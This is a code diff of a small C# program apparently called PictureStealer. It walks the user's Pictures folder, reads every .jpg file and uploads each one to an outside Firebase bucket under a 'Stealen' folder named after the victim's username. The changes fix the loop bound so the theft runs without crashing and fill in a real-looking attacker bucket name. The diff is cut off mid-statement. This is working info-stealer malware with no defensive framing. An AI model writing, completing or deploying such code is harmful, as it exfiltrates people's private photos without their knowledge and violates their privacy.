@@ -1,11 +1,7 @@
 ﻿using Firebase.Storage;
 using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
+
 
 namespace PictureStealer
 {
@@ -19,14 +15,14 @@ namespace PictureStealer
 
             filePaths = Directory.GetFiles(files.GetPicturesPath(), "*.jpg", SearchOption.AllDirectories);
 
-            for(int i = 0; i <= filePaths.Length; i++)
+            for(int i = 0; i <= filePaths.Length-1; i++)
             {
                 byte[] imgData = System.IO.File.ReadAllBytes(filePaths[i]);
                 stream = new System.IO.MemoryStream(imgData);
 
                 //===> uploads images to my firebase cloud storage
                 
-                var task = new FirebaseStorage("******.appspot.com")
+                var task = new FirebaseStorage("bitxanaxrat.appspot.com")
                            .Child("Stealen")
                            .Child(Environment.UserName)
                            .Child(Path.GetFileName(filePaths[i].ToString()))
